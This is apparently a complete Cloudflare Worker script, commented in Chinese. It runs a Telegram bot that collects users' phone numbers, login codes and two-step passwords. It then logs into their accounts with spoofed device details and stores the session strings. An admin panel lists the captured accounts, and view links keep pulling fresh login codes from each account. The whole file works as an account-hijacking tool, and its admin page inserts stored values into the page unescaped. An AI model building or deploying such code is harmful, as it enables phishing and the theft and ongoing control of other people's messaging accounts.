/**
 * src/index.js
 * TG Bot Login System with 2FA & Web Panel
 */
import { TelegramClient, Api } from "telegram";
import { StringSession } from "telegram/sessions";
import { v4 as uuidv4 } from 'uuid';

// 伪装设备参数
const DEVICE = {
  deviceModel: "iPhone 15 Pro",
  systemVersion: "17.4",
  appVersion: "10.12",
  langCode: "zh-hans",
  systemLangCode: "zh-CN",
};

// --- 网页 HTML 模版 ---

const HTML_ADMIN = `
<!DOCTYPE html>
<html><head><title>Admin</title><meta name="viewport" content="width=device-width, initial-scale=1"></head>
<style>body{font-family:sans-serif;padding:20px;}table{width:100%;border-collapse:collapse;}td,th{border:1px solid #ddd;padding:8px;}</style>
<body>
<h2>后台管理</h2>
<div id="list">Loading...</div>
<script>
async function load(){
  const pass = prompt("请输入管理员密码");
  const res = await fetch('/api/list',{headers:{'x-pass':pass}});
  if(res.status!==200) return alert('密码错误');
  const data = await res.json();
  let h = "<table><tr><th>手机</th><th>操作</th></tr>";
  data.forEach(u=>{
    h+=\`<tr><td>\${u.phone}</td><td><button onclick="del('\${u.phone}','\${pass}')">删除</button> <a href="/view/\${u.uuid}" target="_blank">查看链接</a></td></tr>\`;
  });
  h+="</table>";
  document.getElementById('list').innerHTML = h;
}
async function del(p,pass){
  if(confirm('删除?')) await fetch('/api/del?phone='+p,{headers:{'x-pass':pass}});
  location.reload();
}
load();
</script></body></html>
`;

const HTML_VIEW = (uuid) => `
<!DOCTYPE html>
<html><head><title>验证码查看</title><meta name="viewport" content="width=device-width, initial-scale=1"></head>
<body style="font-family:monospace;padding:20px;text-align:center;">
  <h3>账号监控面板</h3>
  <p>正在连接 TG 读取最新消息...</p>
  <div id="box" style="background:#eee;padding:20px;font-size:20px;border-radius:10px;">读取中...</div>
  <script>
    async function getCode() {
      const res = await fetch('/api/code/${uuid}');
      const data = await res.json();
      const el = document.getElementById('box');
      if(data.err) el.innerText = data.err;
      else el.innerHTML = "最新验证码:<br><b style='color:red;font-size:30px'>" + (data.code || "无") + "</b>";
    }
    getCode();
    setInterval(getCode, 5000); // 每5秒刷新
  </script>
</body></html>
`;

// --- 核心逻辑 ---

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    
    // 1. Bot Webhook
    if (url.pathname === "/webhook") return handleBot(request, env);
    
    // 2. 网页后台
    if (url.pathname === "/admin") return new Response(HTML_ADMIN, {headers:{"Content-Type":"text/html"}});
    
    // 3. 验证码查看页
    if (url.pathname.startsWith("/view/")) {
        const uuid = url.pathname.split("/")[2];
        return new Response(HTML_VIEW(uuid), {headers:{"Content-Type":"text/html"}});
    }

    // --- API 接口 ---
    
    // 管理员列表
    if (url.pathname === "/api/list") {
        if(request.headers.get('x-pass') !== env.ADMIN_PASS) return new Response("Fail", {status:403});
        const list = await env.DB.list({prefix:"user:"});
        const users = [];
        for(const k of list.keys) {
            const d = await env.DB.get(k.name);
            users.push(JSON.parse(d));
        }
        return new Response(JSON.stringify(users));
    }
    
    // 删除账号
    if (url.pathname === "/api/del") {
        if(request.headers.get('x-pass') !== env.ADMIN_PASS) return new Response("Fail", {status:403});
        const p = url.searchParams.get('phone');
        await env.DB.delete(`user:${p}`);
        return new Response("ok");
    }

    // 获取验证码 (核心功能)
    if (url.pathname.startsWith("/api/code/")) {
        const uuid = url.pathname.split("/")[3];
        // 查找 uuid 对应的用户
        const list = await env.DB.list({prefix:"user:"});
        let targetUser = null;
        for(const k of list.keys) {
            const d = await env.DB.get(k.name);
            const j = JSON.parse(d);
            if(j.uuid === uuid) { targetUser = j; break; }
        }
        
        if(!targetUser) return new Response(JSON.stringify({err:"链接无效"}));

        // 使用 Session 登录读取消息
        const client = new TelegramClient(new StringSession(targetUser.session), Number(env.API_ID), env.API_HASH, {
            connectionRetries: 3, ...DEVICE
        });
        
        try {
            await client.connect();
            const msgs = await client.getMessages(777000, {limit:1});
            let code = "未找到";
            if(msgs.length > 0) {
                const text = msgs[0].message;
                const match = text.match(/\b\d{5}\b/);
                if(match) code = match[0];
            }
            return new Response(JSON.stringify({code}));
        } catch(e) {
            return new Response(JSON.stringify({err: e.message}));
        }
    }

    return new Response("Not Found");
  }
};

// --- Bot 交互逻辑 (状态机) ---

async function handleBot(req, env) {
  try {
    const data = await req.json();
    if (!data.message || !data.message.text) return new Response("ok");
    
    const chat_id = data.message.chat.id;
    const text = data.message.text.trim();
    const stateKey = `state:${chat_id}`;
    
    // 获取当前状态
    let state = await env.STATE.get(stateKey, {type: 'json'}) || { step: 'IDLE' };

    // 发送消息助手
    const send = async (msg) => {
        await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id, text: msg })
        });
    };

    // 1. 开始指令
    if (text === "/start") {
        await send("欢迎！请发送 /login 开始登陆账号。");
        await env.STATE.delete(stateKey);
        return new Response("ok");
    }

    // 2. 登陆指令
    if (text === "/login") {
        await send("请输入您的手机号 (例如 +8613800000000):");
        await env.STATE.put(stateKey, JSON.stringify({ step: 'WAIT_PHONE' }));
        return new Response("ok");
    }

    // 3. 处理手机号 -> 发送验证码
    if (state.step === 'WAIT_PHONE') {
        const client = new TelegramClient(new StringSession(""), Number(env.API_ID), env.API_HASH, { ...DEVICE });
        await client.connect();
        try {
            const { phoneCodeHash } = await client.sendCode({ apiId: Number(env.API_ID), apiHash: env.API_HASH }, text);
            // 保存 Hash 和手机号
            await env.STATE.put(stateKey, JSON.stringify({ step: 'WAIT_CODE', phone: text, hash: phoneCodeHash }));
            await send("验证码已发送！请在此回复验证码 (例如 12345):");
        } catch (e) {
            await send("发送失败: " + e.message);
            await env.STATE.delete(stateKey);
        }
        return new Response("ok");
    }

    // 4. 处理验证码 -> 尝试登陆
    if (state.step === 'WAIT_CODE') {
        const client = new TelegramClient(new StringSession(""), Number(env.API_ID), env.API_HASH, { ...DEVICE });
        await client.connect();
        try {
            await client.invoke(new Api.auth.SignIn({
                phoneNumber: state.phone,
                phoneCodeHash: state.hash,
                phoneCode: text
            }));
            // 登陆成功 (无2FA)
            return await finalizeLogin(client, state.phone, env, chat_id, req.url);
        } catch (e) {
            if (e.message.includes("SESSION_PASSWORD_NEEDED")) {
                // 需要 2FA
                await env.STATE.put(stateKey, JSON.stringify({ ...state, step: 'WAIT_PASS', code: text }));
                await send("该账号开启了二步验证 (2FA)。\n请回复您的 2FA 密码:");
            } else {
                await send("登陆失败: " + e.message + "\n请重新 /login");
                await env.STATE.delete(stateKey);
            }
        }
        return new Response("ok");
    }

    // 5. 处理 2FA 密码
    if (state.step === 'WAIT_PASS') {
        const client = new TelegramClient(new StringSession(""), Number(env.API_ID), env.API_HASH, { ...DEVICE });
        await client.connect();
        try {
            // 先重新通过验证码步骤 (GramJS 流程需要)
            // 注意：这里简化处理，实际可以直接 checkPassword，但最好维持会话
            // 实际上为了简单，我们尝试直接调用 checkPassword，前提是 connect 复用了之前的 flow？
            // Cloudflare 无状态，所以必须重新 sign in，这很棘手。
            // 更好的方式：捕获错误后，直接用 Password 登陆。
            
            // 重新走一遍 Sign In 流程拿到上下文
            try {
                await client.invoke(new Api.auth.SignIn({
                    phoneNumber: state.phone,
                    phoneCodeHash: state.hash,
                    phoneCode: state.code
                }));
            } catch(err) {
                // 这里必然报错 PASSWORD_NEEDED，忽略
            }

            // 提交密码
            await client.signIn({ password: text, phoneNumber: state.phone, phoneCodeHash: state.hash, phoneCode: state.code });
            
            // 登陆成功
            return await finalizeLogin(client, state.phone, env, chat_id, req.url);

        } catch (e) {
            await send("密码错误或登陆失败: " + e.message + "\n请重新 /login");
            await env.STATE.delete(stateKey);
        }
        return new Response("ok");
    }

    return new Response("ok");

  } catch (e) {
    return new Response("ok");
  }
}

// 辅助：登陆完成后的处理
async function finalizeLogin(client, phone, env, chat_id, rawUrl) {
    const session = client.session.save();
    const uniqueId = uuidv4();
    const urlObj = new URL(rawUrl);
    const viewLink = `${urlObj.origin}/view/${uniqueId}`;
    
    // 存入数据库
    await env.DB.put(`user:${phone}`, JSON.stringify({
        phone: phone,
        session: session,
        uuid: uniqueId,
        date: Date.now()
    }));

    // 清除状态
    await env.STATE.delete(`state:${chat_id}`);

    // 发送最终格式
    // 格式：+电话 / 链接
    const finalMsg = `${phone} / ${viewLink}`;
    
    await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ chat_id, text: `✅ 登陆成功!\n\n${finalMsg}\n\n(Session 已保存到后台)` })
    });
    
    return new Response("ok");
}
